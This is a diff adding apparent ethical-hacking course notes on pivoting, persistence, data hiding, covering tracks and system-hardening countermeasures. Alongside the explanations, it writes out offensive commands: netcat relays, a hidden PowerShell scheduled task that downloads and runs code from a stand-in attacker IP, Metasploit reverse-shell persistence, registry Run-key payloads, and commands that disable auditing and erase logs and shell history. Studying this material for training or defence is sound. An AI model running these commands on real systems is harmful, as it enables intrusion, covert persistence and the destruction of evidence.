@@ -1443,19 +1443,692 @@ run auxiliary/analyze/jtr_crack_fast
 \\ Attempt to add a route to those subnets into the target's routing table
 	post/multi/manage/autoroute
 	
+```
+
+
+### 6.18 PIVOTING
+
+#### What is PIVOTING?
+- What is pivoting uses a compromised machine to get into an otherwise inaccessible private network or service
+- You can
+	- Remote control the compromised machine to start new attacks against the internal
+	- Use the compromised machine as a router between the attacker and the internal network
+
+#### PIVOTING THROUGH REMOTE CONTROL
+-  The attacker compromises a host that has access to both the public and private network. For example
+	- A web server in the target DMZ
+	- An internal host (compromised via social engineering) with a reverse connection to the attacker
+- Attack tools are uploaded to the compromised host
+- The compromised host acts as a staging point to further attack the internal network 
+- (via remote control) the compromised host is doing the attacking
+- Common remote control methods include
+	- RDP/VNC
+	- Meterpreter
+	- RAT 
+	- Telnet/SSH
+	- psexec
+#### PIVOTING THROUGH ROUTING
+- AKA Network pivoting
+- The attacker has compromised a host but cannot upload or run additional tools on that host for whatever reason:
+	- Wrong OS
+	- Limited resources
+	- Antivirus
+	- Other restrictions
+- The attacker can use the Meterpreter session itself on the compromised host as a router
+- Since the routing is happening through the VPN of the Meterpreter session, Its doesn't matter if the internal network uses private IP addresses
+	- The attacker adds a router to the internal network, with the session as the default gateway
+
+#### METASPLOIT AUTOROUTE MODULE
+- Creates a route using the Meterpreter session as the default gateway.
+```
+meterpreter > background
+msf6 > use post/multi/manage/autoroute 
+msf6 post (multi/manage/autorouter) > show options
+msf6 post (multi/manage/autorouter) > set SESSION 1
+msf6 post (multi/manage/autorouter) > Set SUBNET 10.10.10.0
+msf6 post (multi/manage/autorouter) > Set NETMASK /24
+msf6 post (multi/manage/autorouter) > run
+\\ Note: You will be limited to using metaspoit modules only to attack internal targets
+
+```
+#### NETCAT RELAYS
+- Netcat can be configured to bounce an attack from machine to machine, or from port to port within the same machine
+- It involves setting up both a Netcat listener and a Netcat client on the same machine 
+- The traffic is passed between the two Netcat processes
+- you can relay:
+	- Traffic between ports on the same machine
+	- Traffic from a client on that attacker, through the relay, to a listener on the target
+	- Traffic between two clients as a meet-in-the-middle relay
+
+#### NETCAT RELAY EXAMPLE
+- You must enable Netcat on the relay machines and the target
+- You create a daisy of Netcat instances
+- Each Netcat listener launches another NetCast instance which will be the client to the next listener
+	- Until we get to the final listener on the target
+- You can have one or multiple relay machines as needed
+
+
+#### NETCAT INTERNAL PORT RELAY EXAMPLE
+- Find a way to install Netcat on microsoft ISS 5.0 (e.g. unicode exploit)
+- Configure Netcat to listen on port 80 (Cut in front of the web service, intercepting any traffic sent to the port)
+- [Firewall permits traffic to port 80]
+- Configure the Netcat listener to relay traffic to another instance of Netcat, a client that will forward the traffic to TCP 135 (DCOM service using RPC)
+- Use Metasploit to send a buffer overflow ms03_026_dcom to port 80
+- Attack passes through the firewall and is relayed to the DCOM service on port 135
+- SCORE
+- METASPLOIT SENDING EXPLOIT TO NETCAT
+- `exploit/windows/dcerpc/ms03_026_dcom`
+
+#### WINDOWS LISTENER-TO-CLIENT RELAY
+
+- Create a relay that sends packets from the localport to a Netcat client connected to TargetIPAddress on the port
+- On the relay, when the attacker connects to the nc listner, the listener launches a client to the target listener
+- Set up relay client, then listener
+- `c:\echo nc 10.1.2.3 445 > relay.bat `
+- `c:\nc -L -p 80 -e relay.bat`
+
+#### WINDOWS LISTNER-TO-LISTENER RELAY
+- Creates a relay that will send packets from any connection on Localport1 to any connect on Localport2
+- The relay is in a DMZ it acts as a meet-in-the-middle
+- `c:\> echo nc -L -p 8008 > relay.bat`
+- `c:\nc -L -p 80 -e relay.bat`
+- The target has a scheduled script that periodically exfiltrates a file to the relay
+
+
+### 6.19 MAINTAINING ACCESS
+- Getting an initial foothold inside a network during a red team operation is a time consuming task
+- Persistence is key to a successful red team operation
+- There are a number of ways to achieve persistence
+	- RATS
+	- Scheduled tasks
+	- Add/modify registry keys
+	- Kerberos Golden Ticket or other backdoor account
+- Tool to add persistence
+	- Metasploit
+	- Empire(GitHub)
+		- PowerShell post-exploitation Tool
+	- SharePersist (Github)
+
+#### REMOTE ACCESS TROJAN AND BACKDOORS
+- A Remote Access Trojan (RAT) is a malware program that includes a back door for administrative control over the target computer
+- RATs are usually downloaded invisibly with a user-requested program -- such as a game -- or as an email attachment
+- They are difficult to detect if designed to look like normal administrative remote access tools
+- They allow the attacker to connect later at any time
+- Victim has a "Listener" that opens a port for you to connect to
+- Or, the victim can make a reverse connection to you the hacker
+	- Good for getting past a firewall
+	- The hacker must set up a listener
+
+#### RAT AND BACKDOOR TOOLS
+- VenomRAT
+- Stitch
+- Ghost
+- Social_X
+- NullRAT
+- The Fat Rat
+- RomCom RAT
+- RATMilad
+- CodeRAT
+- Imminent Monitor RAT
+- Konni RAT
+- ZuoRAT
+- 
+
+
+#### SCHEDULED TASKS
+- Windows Operating Systems provide a utility (schtasks.exe)
+- This enables system administrators to execute a program or a script at a specific given date and time
+- This kind of behavior has been heavily abused by threat actors and red teams as a persistence mechanism
+- You don't need to be an administrator to schedule a task.
+```
+schtask /create /tn persist /tr
+"c:\windows\syswow64\windowPowerShell\v1.0\powershell.exe -WindowStyle hidden -Nologo -NonInteractive -ep bypass -nop -c 
+'IEX ( new-object net.webclient),downloadstring ( ''http://<attacker IP>:8080/ZPWLywg)'" /sc onlogon /ru SYSTEM
+```
+
+#### REGISTRY RUN KEYS EXAMPLE
+- Add registry keys from a terminal, referencing the malicious payload
+- The payload executes when the user logs on
+- reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run"
+- `/v wePwnU /t REG_SZ /d "C:\Users\tmp\pwn.exe"`
+- reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce"
+- `/v wePwnU /t REG_SZ /d "C:\Users\tmp\pwn.exe"`
+- reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServices"
+- `/v wePwnU /t REG_SZ /d "C:\Users\tmp\pwn.exe"`
+- reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce"
+- `/v wePwnU /t REG_SZ /d "C:\Users\tmp\pwn.exe"`
+- 
+```
+If you have an elevated credential, you prefer to use LOCAL_MACHINE
+The payload will execute every time the system boots, regardless of whether a user logs on or not
+
+reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run"
+/v wePwnU /t REG_SZ /d "C:\tmp\pwn.exe"
+
+reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce"
+/v wePwnU /t REG_SZ /d "C:\tmp\pwn.exe"
+
+reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices"
+/v wePwnU /t REG_SZ /d "C:\tmp\pwn.exe"
+
+reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce"
+/v wePwnU /t REG_SZ /d "C:\tmp\pwn.exe"
+```
+
+Two Additional registry keys can be used to execute either an arbitrary payload or a DLL
+
+```
+reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001"
+/v wePwnU /t REG_SZ /d "C:\tmp\pwn.exe"
+
+reg add
+"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend" /v wePwnU /t REG_SZ /d "C:\tmp\pwn.dll"
+```
+
+
+#### METASPLOIT PERSISTENCE
+You can run Metasploit script
+```
+run persistence -U -P windows/x64/meterpreter/reverse_tcp -i 5 -p 443 -r <attacker IP>
+```
+
+ - Or you can use the Metasploit post module persistence_exe:
+```
+use post/windows/manage/persistence_exe
+set REXEPATH /tmp/pentestlab.exe
+set SESSION 2
+set STARTUP USER
+set LOCALEXEPATH C:\\tmp
+run
+```
+
+#### ADDITIONAL PERSISTENCE TOOLS
+- Metasploit persistence module examples:
+	- Windows Manage User Level Persistent Payload Installer
+	- Windows Persistent Registry Startup Payload Installer
+	- Windows Persistent Service Installer
+	- Persistent Payload in Windows Volume Shadow Copy
+- GitHub lists 33 post exploitation persistence repositories
+	- Example:harleyQu1nn/AggressorScripts/tree/master/Persistence
+
+#### 6.20 HIDING DATA
+
+#### HIDING FILES
+- If you want to ensure that files you leave behind are not visible, you can use various methods to hide them:
+	- File attributes 
+	- Alternate Data streams
+	- Steganography
+	- Third-party rootkits, drivers and DLLs to hide files and processess
+
+#### HIDING FILES AND FOLDERS USING FILE ATTRIBUTES
+- In Windows: attrib +h filename
+	- attrib +h hideme.txt
+- Hide a folder, including all files and subfolders inside
+	- attrib +h hidethisfolder /s /d
+- In Linux, add a. to the beginning of the filename
+	- bad.text .bad.text
+
+ALTERANTE DATA STREAMS
+- AKA ADS or NTFS Steams
+- In Windows, you can use ADS to hide files
+- ADS is a feature of NTFS
+	- Created to make Windows compatible with the MAC file system
+	- You can use it to hide files
+- The hidden file is a "Stream" of another (primary) file
+- You can see the primary file in the GUI or at a command prompt
+- Any Streams connected to the primary file are hidden
+- Streams do add to the overall size of the primary file
+- The basic syntax to create a stream on a primary file is
+	- filename.ext:stream
+
+#### ADS EXAMPLE
+- FAT File
+	- File.ext (i) Attributes (ii) Data
+- NTFS 
+	- (i) Attributes (ii) Main Stream (iii)Alternate Steam (IV) Alternate Stream (V) Alternate Stream
+
+
+#### HOW TO LIST ADS FOR A FILE
+- Command Prompt
+	- `dir /R filename`
+- PowerShell:
+	- `Get-Item filename -Steam *`
+- Read ADS contents in windows 10:
+	- `more < "filename:stream name"
+	- `Get-Content "filename" -Stream "stream name"`
+
+#### CREATE AN ADS
+- Create a simple text file
+	- echo Hello World ! > hello.txt
+- Create an alternate stream for hello.txt called "test"
+	- echo Testing NTFS streams > hello.txt:test
+- Open the text file normally. You only see the content "Hello World!"
+- View the stream content. You should see the alt content "Testing NTFS streams" 
+	- `notepad hello.txt:test`
+
+#### HIDE AN EXECUTABLE IN AN ADS
+Hide notepad.exe is an ADS file called hidden.exe
+Attach it to the text file hello.txt
+`c:\> type c:\windows\notepad.exe > hello.txt:hidden.exe`
+
+
+- ##### DEFEND AGAINST NTFS STREAMS
+- Move suspected files to a FAT partition or email them as attachments
+- Use file integrity checkers like Tripwire or md5sum to verify the file hasn't changed
+- dir /R will show streams from SystemInternals
+- You can use FTK (forensics Toolkit) to look for this
+
+
+#### STREAM DETECTOR TOOLS
+- Systeminternal streams
+- Eventsentry
+- Lads
+- adslist.exe
+- StreamDetector
+- ADS Detector
+- Stream Armor
+- Forensic Toolkit
+- ADS Spy
+- ADS Manager
+- ADS Scanner
 
 
 
+#### STEGANOGRAPHY
+The art and science of hiding information by embedding messsages within other, seemingly harmless messages
+It works by replacing bits of useless or unwused data in regular computer files with bits of different invisible information
+Data can be anything
+	Text
+	Image
+	Media file
+	Encrypted / not encrypted
+Carrier files appear perfectly normal. You can read and play them
+Hidden data travels with the file
+Requires knowledge of which file is the host and how to retrieve the hidden data
 
-post
+#### STEGANOGRAPHY TYPES
+- Image Steganography:-
+	- Images are the popular cover objects used for steganography
+	- In Image steganography the uses hides the information in image files of different formats such as .png, .jpg, .bmp, etc	
+- Document Steganography
+	- In the document steganography user adds white space and tabs at the end of the lines 
+- Folder Steganography
+	- Folder steganography refers to hiding one or more files in a folder
+	- In this process, use moves the file physically but keeps the associated files in its original folder for recovery
+- Video Steganography
+	- Video steganography is a technique to hide fiels with any extension into a carrying video file
+	- One can apply video steganography to different format of files such as .avi, ,mpg4, .wmv, etc.
+- Audio Steganography
+	- In audio steganography user embeds the hidden messages in digital sound format
+- Whitespace steganography
+	- In the white space steganography, user hides the messages in ASCII text by adding white spaces to the end of the lines
+- Web Steganography
+	- In the web steganography, user hides web objects behind objects and uploads them to a webserver
+- Spam/Email Steganography
+	- One can use spam emails for secreat communication by embedding the secreat messages in some way and hinding the embedded data in the spam emails
+	- This technique refers to spam email steganography
+- DVD ROM Steganography
+	- attacker embeds the content in audio or graphical mode
+- Natural Text Steganography
+	- attacker converts the sensitive information into a user-definable free speech such as a play.
+- Hidden OS steganography:
+	- attacker hides one operating System into other
+- C++ source code Steganography
+	- User hides a set of tools in the files
+> At a very high scale level, steganography is used by terrorist to issue commands to their followers on websites even in broad daylight
+
+
+
+#### STEGANOGRAPHY TOOLS
+- XIAO STEGANOGRAPHY
+- Image Steganography
+- Steghide
+- Crypture
+- Steganographx Plux 2.0
+- rSteg
+- SSuite Picsel
+- Our Secret
+- Camouflage
+- OpenStego
+- SteganPEG
+- Hide n Send
+- SNOW
+- QuickStego
+- ImageHide
+- GIFShuffle
+
+
+#### DETECTING STEGANOGRAPHY
+- Good Detection requires the original (uncompromised) file
+- Text files
+	- Unusual patterns
+	- Appended extra spaces and invisible characters
+- Image files
+	- Too many distortions in image
+	- Image quality degraded
+	- Compare original and stego image with respect to color composition, luminance, pixel relationships
+	- Scan least significant bits (LSBs) for hidden data
+- Audio Files
+	- Scan inaudibles frequencies and LSBs for hidden data
+- Use image and audio techniques
+
+#### STEGANOGRAPHY DETECTION TOOLS
+Gargoyle Investigator forensic Pro
+StegSecret
+StegAlyzer
+Steganography Studio
+Virtual Steganographic laboratory (VSL)
+Stegdetect
+
+
+#### ADDITIONAL FILE HIDING METHODS
+- Unexpected locations
+	- Hide files in places like the recycle bin, or system32 folder
+- Function modification
+	- Replace file reporting tools such as file explorer, dir and ls with malicious versions
+- Function hooking
+	- Use a rootkit to intercept low-level calls (such as listing files) to the operating system kernel 
+	- Any lists of files and folders returned to the calling application will not include the hidden objects
+	- File-hinding tools ecamples:
+		- Wise folder hider
+		- Vovsoft
+		- Gilisoft
+		- Winmend
+	- GitHub (131) repos
+
+### 6.21 COVERING TRACKS
+- Your Primary task will be to clear/modify /falsify logs
+- Also remove any files/ artifacts that could be discovered
+- Clear registry entries and command line history
+- Windows `(Even viewer logs)`
+	- There are either System , Application or Security logs
+	- logs are XML format with .evtx extension. Stored in `%systemroot%\winevt\logs`. Note prior to Window 7 / server 2008, evt files were binary and stored as *.evt*
+	- Event found in `system` and `application` logs would be Information/Warning/Error
+		- Information: lets you know that an application, service or driver completed an operation
+		- Warning: informs you of a situation that is probably significant, but not yet a serious problems, for example , low disk space will trigger a warning event
+		- Error: Indicates a serious problem that may cause a loss of functionality or loss of data.
+	- Event found in `security` logs
+		- SuccessAudit
+			- Records a successful event that is audited for security purposes
+			- For example , when a user successfully logs on to the system, a success audit event is recorded
+		- Failure Audit
+			- Records an unsuccessful event that is audited for security purposes
+			- For example, when a user unsuccessfully tries to log on to the system, failure audit event is recorded
+>Note: Audit logging can also be enabled for file, print, and Active Directory access
+>	Security logging has to be enabled in group policy
+>	Logging then has to be enabled for a specific object in its security tabs
+- Linux `/var/log/messages`
+
+#### HIDING NETWORK ACTIVITY
+
+- Use reverse HTTP shells
+	- Victim starts HTTP session to attacker
+	- This looks normal
+- Use reverse ICMP tunnels
+	- Victim ping out past firewalls with payloads in ICMP data
+- Use DNS tunneling
+	- Hide data inside DNS queries/replies
+- Use TCP covert channels
+	- IP ID field
+	- TCP ack#
+	- TCP initial sequence
+
+#### CLEARING ONLINE/BROWSER TRACKS
+- User private browsing
+- Delete browsing history
+- Disable stored history
+- delete private data
+- Clear cookies on exit
+- Clear data in password manager
+- Delete saved sessions
+- Delete user javaScript
+- Clear cache on exit
+- Delete downloads
+- Disable password manager
+- Clear toolbar data
+- Turn off autoComplete
+- Use multiple user accounts
+- Remove most recently used (MRU)
+- Turn of most used apps and recently opened items
+
+
+#### CLEARING THE EVENT LOG
+
+- Disable auditing ahead of time to prevent logs from being captured
+- Delete the entries pertaining to your actions
+- Corrupt log file and make it unreadable
+- Tools to clear Event logs
+	- Ccleaner : Automate system cleaning, scrub online history , log files ,etc
+	- Eventlogedit-evtx-evolution: Remove individual lines from EVTX files, useful for window 7 or server 2012 or later
+	- Metasploit clearev 
+
+##### CHANGING EVENT LOG SETTINGS
+#Auditpol
+```
+auditpol \\TargetIP /disable
+
+\\ display all audit policies in details if is enable (Object Access, System, Logon/logoff Previlege Use and so on)
+auditpol /get /category:* 
+
+\\ Reset (Disable) the sytem audit policy for all subcategories
+auditpo /Clear 
+
+
+\\ Remove all per-user audit policy settings and disables all system audit policy settings
+auditpol /remove
+
+```
+
+#### CLEARING MRU AND COMMAND HISTORY
+- Detect and clean MRU (most recently used ) lists on your computer
+	- MRU lists contain information such as the names and /or locations of the last files you have accessed
+	- They are located all over the registery for almost any file type
+	- MRUblaster - https://www.brightfort.com/mrublaster.html
+- Clear out command line history
+	- CMD prompt: Press [alt] + [f7]
+	- Powershell : type clear-history
+- Additional Tools to cover tracks in Windows
+	- Clear_Event_Viewer_logs.bat
+	- Free Internet Windows Washer
+	- DBAN
+	- Blancco Drive Eraser
+	- Privacy Eraser
+	- Wipe
+	- BleachBit
+	- ClearProg
+	- ClearMyHistory
+
+#### COMMON LINUX LOGS
+- On linux messages are saved at 
+	- General Messages` /var/log/messages` or 
+	- System Messages  `/var/log/syslog/`
+	- Authentication logs: `/var/log/auth.log or /var/log/secure` for successful or failed logins and authentication methods
+	- Boot logs: `/var/log/boot.log` for any messages logged during startup
+	- mail server `/var/log/maillog or /var/log/mail.log` for logs related to mail servers
+
+
+#### CLEARING LINUX LOGS
+```
+\\ It is possible to echo whitespace to clear the event log file:
+	echo " " > /var/log/auth.log
+\\using 'black hole dev/null'
+	echo /dev/null > auth.log
+\\ To tamper/ modify the log files, you can use sed stream editor to delete , replace and insert data.
+
+\\ delete specific lines. Example: delete lines from file having word 'opened'
+	sed -i '/opened/d' /var/log/auth.log
+
+\\ Use hidden files
+	name a malicious file. ".log" with space between and log then hide in /dev or /tmp
 
 ```
 
 
+#### DISABLEING or CLEARING BASH SHELL HISTORY
+```
+export  HISTSIZE = 0 (disable the history)
+
+\\ clear stored history
+history -c 
+
+\\ clear stored history for current shell
+history -w 
 
 
+\\ Shred or completed delete evidence
+shred -zu ~/.bash_history
+shred ~/.bash_history && cat /dev/null > .bash_history && history  -c && exit
+
+\\ Force deletion of bash_history file
+	rm -rf ~/.bash_history
+
+```
+
+Open .zsh_history from /home/USER and delete all lines in the text files and save the file
+
+#### 6.22 SYSTEMS HACKING COUNTER MEASURES
+
+#### Defend against System Hacking
+- Employ a multilayer , holistic security plan
+- Protect:
+	- Systems
+	- Apps
+	- Data
+	- Infrastructure
+	- Processes
+	- Personnel
+- Utilize
+	- Policies, procedures and training
+	- Network security
+	- Physical security
+	- Change Management
+	- Risk Management
+	- Auditing
+	- Disaster recovery
+	- 
 
 
+#### General System Defense
+- Change defaults
+- Disable unused accounts ,features and services
+- Regularly patch and update the OS, services and applications
+- Regularly verify system file integrity
+- Set permissions and rights based on the principle of least privilege
+- Use VPNs to connect
+- Deploy Intrusion Detection on the network
+- Deploy edge and host firewalls
+
+#### PASSWORD CRACKING COUNTERMEASURES
+- Set a password policy including history, length, complexity and minimum/ maximum age
+- Do not use passwords such as date of birth, spouse / child / pet's name
+- Monitor for local and network-based dictionary/ brute-forcing
+- Prefer long pass phrases over shorter complex passwords
+- Prefer two-factor authentication if possible
+- Enable SYSKEY or BitLocker on Windows to protect the SAM databases
+- Avoid clear text protocols
+- Avoid storing passwords in an unsecure location
+- Employ two-factor authentication such as:
+	- Smart card + PIN
+	- Biometrics and Password
+- When using counter-based authentication, ensure that:
+	- The hardware token or app regularly changes a one-times passcode
+	- often used in conjunction with a password or PIN
+
+#### RAINBOW TABLE COUNTERMEASURES
+- Salting and key stretching make rainbow tables much less effective
+	- These methods add random data to make a key longer
+	- The cracking is a lot harder because the key is now longer
+	- And it's hard to then tell which part is the salt and which part is the actual password
+- Use multifactor authentication
+
+#### PRIVILEGE ESCALATION COUNTERMEASURES
+
+- Restrict interactive login privileges
+- Encrypt sensitive data
+- Assign least privilege to users and applications
+- Assign standard accounts to service when possible
+- Vulnerability scan, fuzz, and stress test applications
+- Patch and update the kernel, web server, and other services regularly
+- Change 'UAC' settings to "Always Notify"
+- Use fully qualified, quoted paths in all windows applications
+- Ensure executables are placed in write-protected directories
+- In macOS, make plist files read-only.
+- Disallow system utilities or software from scheduling tasks
+- Disable the default local administrator account
+
+#### HARDEN WINDOWS
+- Configure Windows to only allow the installation of approved application from controlled software repositories
+- Create from scratch a whitelist of files that are allowed to execute on end-user machines
+	- Specify executables, libraries, scripts  and installers that are allowed to execute.
+- Disable Remote Access
+- Do not use PowerShell 2.0 or earlier
+- Enable Auto-Updates
+- Enable File Backups
+- Install a host-based IDS
+- Disable unnecessary services
+- Install a good antivirus program and keep it updated
+- Change all defaults
+- Set a good password policy
+- Prefer multi-factor authentication
+- Set the screen to lock after inactivity
+- Configure Windows Firewall
+	- Restrict both outbound and inbound ports
+- Use principle of least privilege when setting permission on resources
+
+#### BUILT-IN WINDOWS DEFENDER TOOLS
+Exploit Guard
+Device Guard
+Application Guard
+Credential Guard
+SmartScreen
+Windows Hello
+Windows Sandbox
+Secure Boot
+BitLocker
 
 
-#### 6.23 SYSTEM HACKING REVIEW p923
+#### DEFEND AGAINST LLMNR / NBT-NS POISINING
+- Configure group policy to disable LLMNR & NBT-NS
+- Group policy Editor --> Local computer Policy --> Computer Configuration --> Administrative Templates --> Network --> DNS Client --> Turn off multicase name resolution
+- Control Panel --> Network and Internet --> Network and sharing Center --> Change Adapter Settings --> Properties --> TCP/IPv4 --> General --> WINS --> Disable NetBIOS over TCP/IP
+
+
+#### HARDEN LINUX
+- Install security updates and patches
+- Use strong passwords
+- Prefer MFA
+- Implements a firewall
+- Delete unused packages
+- Bind processes to localhost 127.0.0.1
+	- Not All services have to be available via the  network
+	- For example, when running a local instance of MySQL on your web server, let it only listen on a local socket or bind to localhost
+	- Then configure your application to connect via this local address, which is typically already the default.
+- Clean up old home directories and remove the users
+- Security configurations
+	- Read the man pages for each application for guidance on secure configuration
+- Use disk encryption when possible
+- Use the principle of least privilege to limit System and resource access.
+- Monitor the system
+	- Implement normal system monitoring and implement monitoring on security events
+- Create backups (all test)
+- Perform system auditing
+	- Use a security tool like Lynis to perform a regular audit of your system
+
+
+### 6.23 SYSTEM HACKING REVIEW p923
+
+#### SYSTEM HACKING REVIEW
+- There are many tools and approaches your can use to hack a system
+- When hacking system services, prefer buffer overflows that allow remote privilege execution
+- Use a compromised host to pivot into the rest of the internal network
+- If you can only compromise a system at a standard user level, seek to escalate privilege 
+- Maintain control through a persistent payload
+- There are many tools and approaches you can use to hack system
+- When hacking system services, prefer buffer overflows that allows privileged remote execution.
+- Use a compromised host to pivot into the rest of the internal network
+- Maintain control through a persistent payload
+- If you exhaust your password cracking dictionary try brute forcing,, MITM or social engineering to get the password
+- Use NTFS Streams or steganography to hide files and data
+- Don't forget to cover your tracks
+- When you are through, restore all systems, clean out all artifacts and documents your finding
+
